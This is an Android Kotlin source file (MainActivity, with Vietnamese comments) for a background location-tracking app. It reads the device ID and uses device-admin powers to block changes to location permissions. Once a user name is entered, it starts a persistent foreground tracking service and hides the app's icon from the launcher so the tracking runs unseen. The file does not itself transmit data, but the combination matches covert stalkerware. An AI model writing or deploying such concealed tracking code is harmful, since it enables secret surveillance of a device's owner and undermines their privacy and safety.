package com.plcoding.backgroundlocationtracking

import android.content.*
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.plcoding.backgroundlocationtracking.admin.PolicyManager
import android.content.pm.PackageManager


class MainActivity : AppCompatActivity() {

    private lateinit var deviceId: String
    private val prefs by lazy { getSharedPreferences("app_prefs", Context.MODE_PRIVATE) }

    // BroadcastReceiver nhận dữ liệu location từ LocationService
    private val locationReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            intent?.let {
                val lat = it.getDoubleExtra("latitude", 0.0)
                val lon = it.getDoubleExtra("longitude", 0.0)
                val userName = it.getStringExtra("userName") ?: "unknown_user"

                Log.d(
                    "MainActivity",
                    "📡 [Broadcast] latitude=$lat, longitude=$lon, user=$userName"
                )
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        Log.d("MainActivity", "🎬 onCreate called")

        // Lấy deviceId duy nhất của thiết bị
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            ?: "unknown_device"
        Log.d("MainActivity", "💡 DeviceId = $deviceId")

        // Khởi tạo PolicyManager
        val policyManager = PolicyManager(this)
        if (policyManager.isAdminActive()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                policyManager.blockLocationPermissionChanges()
            }
            policyManager.enforceLocationPolicy()
        }

        // Xử lý UI nhập username
        handleUI()
    }

    override fun onStart() {
        super.onStart()
        Log.d("MainActivity", "▶️ onStart: register locationReceiver")
        LocalBroadcastManager.getInstance(this)
            .registerReceiver(locationReceiver, IntentFilter("LOCATION_UPDATE"))
    }

    override fun onStop() {
        super.onStop()
        Log.d("MainActivity", "🛑 onStop: unregister locationReceiver")
        LocalBroadcastManager.getInstance(this).unregisterReceiver(locationReceiver)
    }

    /**
     * Setup UI nhập userName
     */
    private fun handleUI() {
        val etUserName = findViewById<EditText>(R.id.etUserName)
        val btnSubmit = findViewById<Button>(R.id.btnSubmit)

        val savedName = prefs.getString("userName", null)
        if (!savedName.isNullOrEmpty()) {
            // Nếu đã có userName → khóa lại UI
            etUserName.setText(savedName)
            etUserName.isEnabled = false
            btnSubmit.isEnabled = false
            Log.d("MainActivity", "✅ userName đã lưu: $savedName")

            // Bắt đầu tracking ngay
            startLocationService(savedName)
        } else {
            Log.d("MainActivity", "⚠️ userName chưa có → yêu cầu nhập")

            btnSubmit.setOnClickListener {
                val name = etUserName.text.toString().trim()
                if (name.isNotEmpty()) {
                    prefs.edit().putString("userName", name).apply()
                    Log.d("MainActivity", "📤 userName set: $name")
                    Toast.makeText(this, "Xin chào $name", Toast.LENGTH_SHORT).show()

                    // Start service
                    startLocationService(name)

                    // 👉 Ẩn icon app khỏi launcher sau khi nhập
                    val pm = packageManager
                    pm.setComponentEnabledSetting(
                        ComponentName(this, MainActivity::class.java),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    Log.d("MainActivity", "🚫 App icon hidden from launcher")

                    // Đóng Activity
                    finish()
                } else {
                    Toast.makeText(this, "Tên không được để trống!", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    /**
     * Bắt đầu tracking
     */
    private fun startLocationService(userName: String) {
        Log.d("MainActivity", "🚀 startLocationService for user=$userName, device=$deviceId")

        val intent = Intent(applicationContext, LocationService::class.java).apply {
            action = LocationService.ACTION_START
            putExtra("userName", userName)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Log.d("MainActivity", "📌 Using startForegroundService")
            startForegroundService(intent)
        } else {
            Log.d("MainActivity", "📌 Using startService")
            startService(intent)
        }
    }
}
